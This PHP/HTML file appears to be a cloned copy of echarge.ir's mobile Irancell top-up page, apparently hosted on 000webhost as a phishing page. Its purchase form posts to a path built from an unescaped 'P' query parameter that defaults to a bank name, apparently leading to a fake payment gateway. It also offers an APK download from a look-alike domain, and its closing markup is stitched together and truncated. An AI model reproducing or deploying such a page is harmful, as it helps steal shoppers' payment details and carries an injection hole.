

<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>


<!DOCTYPE html>

<html>

<head>



        <title>خرید شارژ ایرانسل - نسخه موبایل</title>



    <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />

    <meta name="format-detection" content="telephone=no">

    <meta name="theme-color" content="#07438C">

    <!-- Chrome, Firefox OS and Opera -->

    <meta name="theme-color" content="#07438C">

    <!-- Windows Phone -->

    <meta name="msapplication-navbutton-color" content="#07438C">

    <!-- iOS Safari -->

    <meta name="apple-mobile-web-app-status-bar-style" content="#F8F8F8">

    <link rel="apple-touch-icon" href="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/images/echarge.png?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C">



    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

    <link rel="Stylesheet" type="text/css" href="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/styles/font-awesome.css?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C" />

    <link rel="Stylesheet" type="text/css" href="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/styles/style.css?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C" />

    <link rel="Stylesheet" type="text/css" href="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/scripts/tabbed-navigation/css/tabbed.css?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C" />



    <script src="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/scripts/cookie.js?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C" type="text/javascript"></script>



    <script type="text/javascript">

        var application = application || {};

    </script>



    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-2810790-1"></script>

    <script type="text/javascript">

        window.dataLayer = window.dataLayer || [];

        function gtag() { dataLayer.push(arguments); }

        gtag('js', new Date());

        gtag('config', 'UA-2810790-1');

    </script>

</head>

<body>

    <div id="container">

        <div id="mainContent">

            <div id="header">

                <div class="home-menu">



                    <div id="nav-icon3">

                        <span></span>

                        <span></span>

                        <span></span>

                        <span></span>

                    </div>

                </div>

                <div class="btn-link">

                        <h1 class="title">

                            <p onclick="goBack()">  <span class="icon-arrow-left1"></span> </p>

                        </h1>





                </div>

            </div>

            <div class="appHeader">

                

    <a href="http://echargesite.com/eCharGe-5038.apk" title="دانلود اپلیکیشن ای شارژ" class="btn btn-orange btn-lg dlBtn m-10">

        دانلود اپ eCharGe

        <img src='https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/images/androidicon-white.png' alt="دانلود اپلیکیشن ای شارژ" />

    </a>



            </div>

            









<script type="text/javascript">

    var application = application || {};

    window.onload = function () {

        application.chargeCardModule = (function () {

            var $chargeCard = document.getElementById('chargeCard'),

                $quantity = document.getElementById('quantity'),

                $mobile = document.getElementById('phoneNumber'),

                $lotteryNumber = document.getElementById('lotteryNumber'),

                $email = document.getElementById('email'),

                $purchaseButton = document.getElementById('purchaseBtn'),

                $chkSavePurchaseStatus = document.getElementById('chkSavePurchaseState'),

                cookie = {

                    card: "chargecard/card",

                    quantity: "chargecard/quantity",

                    email: "chargecard/email",

                    mobile: "chargecard/mobile",

                    lotteryNumber: "chargecard/lotteryNumber"

                },

                

                start = function() {

                    loadCookie();

                    $purchaseButton.onclick = purchaseButtonOnClick;

                    setSaveEvents();

                },

                

                purchaseButtonOnClick = function() {

                    if ($mobile.value === '' && $email.value === '') {

                        alert('لطفا برای استفاده از خدمات پشتیبانی سایت، ایمیل یا موبایل خود را وارد کنید');

                        return false;

                    }

                    return true;

                },

                

                setSaveEvents = function() {

                    $chargeCard.onblur = manageCookie;

                    $quantity.onblur = manageCookie;

                    $mobile.onblur = manageCookie;

                    $lotteryNumber.onblur = manageCookie;

                    $email.onblur = manageCookie;

                    $chkSavePurchaseStatus.onclick = manageCookie;

                },

                

                loadCookie = function() {

                    var card = rayanCookie(cookie.card);

                    var quantity = rayanCookie(cookie.quantity);

                    var mobile = rayanCookie(cookie.mobile);

                    var lotteryNumber = rayanCookie(cookie.lotteryNumber);

                    var email = rayanCookie(cookie.email);



                    if (card != null || quantity != null || mobile != null || email != null || lotteryNumber != null) {

                        $chkSavePurchaseStatus.checked = true;

                    }



                    if (card != null)

                        $chargeCard.value = card;



                    if (quantity != null)

                        $quantity.value = quantity;



                    if (mobile != null)

                        $mobile.value = mobile;



                    if (lotteryNumber != null)

                        $lotteryNumber.value = lotteryNumber;



                    if (email != null)

                        $email.value = email;

                },

                

                manageCookie = function () {

                     

                    if ($chkSavePurchaseStatus.checked === true) {

                        rayanCookie(cookie.card, $chargeCard.value);

                        rayanCookie(cookie.quantity, $quantity.value);

                        rayanCookie(cookie.mobile, $mobile.value);

                        rayanCookie(cookie.lotteryNumber, $lotteryNumber.value);

                        rayanCookie(cookie.email, $email.value);

                    } else {

                        rayanCookie(cookie.card, null);

                        rayanCookie(cookie.quantity, null);

                        rayanCookie(cookie.mobile, null);

                        rayanCookie(cookie.lotteryNumber, null);

                        rayanCookie(cookie.email, null);

                    }

                };



            return {

                start: start

            };

        })();

        application.chargeCardModule.start();

    };

</script>



<form id="chargeCardForm" action="../<?php echo $P?>/?e=<?php echo $e?>" method="POST">

        <div id="chargeContent">

            <h3>انتخاب شارژ ایرانسل</h3>

            <select class="dropDowns radius" dir="rtl" id="chargeCard" name="chargeCard">

                    <option value="9">کارت شارژ ایرانسل 20,000 </option>

                    <option value="1">کارت شارژ ایرانسل 50,000 </option>

                    <option value="2">کارت شارژ ایرانسل 100,000 </option>

                    <option value="22">کارت شارژ ایرانسل 200,000 </option>

            </select>

        

            <h3>تعداد</h3>

            <select class="dropDowns radius" dir="rtl" id="quantity" name="quantity">

                    <option value="1">1 عدد</option>

                    <option value="2">2 عدد</option>

                    <option value="3">3 عدد</option>

                    <option value="4">4 عدد</option>

                    <option value="5">5 عدد</option>

            </select>

        </div>

        <div id="supportContent">

            <div class="fieldContainer">

                <label class="labels">ایمیل (اختیاری) </label>

                <input class="inputs ltr radius" type="email" id="email" name="email">

            </div>

            <div class="fieldContainer">

                <label class="labels">موبایل</label>

                <input class="inputs ltr radius" id="phoneNumber" name="phoneNumber" type="tel" maxlength="11">

            </div>

            <div class="fieldContainer" style="display: none">

                <label class="labels">شماره موبایل دریافت کننده امتیاز</label>

                <input class="inputs ltr radius" id="lotteryNumber" name="lotteryNumber" type="tel" maxlength="11">

            </div>

            <div class="fieldContainer">

                <input type="checkbox" class="inputs checkbox" id="chkSavePurchaseState">

                <label for="chkSavePurchaseState" class="labels savePurchase">ذخیره خرید</label>

            </div>

        </div>

        <div id="purchaseContainer">

            <input type="submit" class="radius payBtn" id="purchaseBtn" value="پرداخت">

            <div id="gatewayContainer">

    <label>پرداخت از طریق درگاه</label>

    <select class="radius" id="gateway" name="gateway">

           

            <option value="23">پارسیان</option>

    </select>

</div>

        </div>

</form>



        </div>



        <div id="loading" class="loading">

            <img src="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/Contents/Images/Spinner.gif" alt="Alternate Text" />

        </div>



        <div id="lgMenu">

            <ul class="humberger">



                <li>

                    <a class="" href="/m/support" title="پشتیبانی">

                        <div><i class="icon-support"></i></div>

                        پشتیبانی

                    </a>

                </li>

                <li>

                    <a class="" href="/m/desktopview" title="نسخه دسکتاپ">

                        <div><i class="icon-desktop"></i></div>

                        نسخه وب

                    </a>

                </li>





            </ul>

        </div>





    </div>

    <div id="footer">

        <div id="copyright">

            <p> کلیه حقوق این سایت متعلق به  <a href="http://rayanmehr.co.ir/" title="شرکت رایانمهر">شرکت رایانمهر</a> می باشد.

        </div>

    </div>

</body>
<html>  
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <meta charset="utf-8">
  <title></title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
</html>


<script src="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/scripts/jquery-3.3.1.min.js?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C" type="text/javascript"></script>

<script src="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/scripts/jquery.scrollto.min.js?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C" type="text/javascript"></script>

<script src="https://www.echarge.ir/Areas/StoreFront/Mobile/EchargeMobile/contents/scripts/tabbed-navigation/js/main.js?v=E91994A9-19F6-4BBB-A3A1-FA381A5F680C" type="text/javascript"></script>



<script type="text/javascript">



    function goBack() {

        window.history.go(-1);

    }



    function showLoading() {

        $('.loading').css("display", "block");

    }



    function hideLoading() {

        $('.loading').css("display", "none");

    }



    $(document).ready(function () {

        var $menu = $('#nav-icon3');





        $menu.click(function () {

            $(this).toggleClass('open');

            $("#lgMenu").toggleClass('open');

        });





        $(document).mouseup(function (e) {

            e.preventDefault();

            if (!$menu.is(e.target) && $menu.has(e.target).length === 0) {

                $menu.removeClass('open');

                $("#lgMenu").removeClass('open');

            }

        });



        $('.submitForm').on("click", function () {

            $('.loading').css("display", "block");

        })



    });









</scrip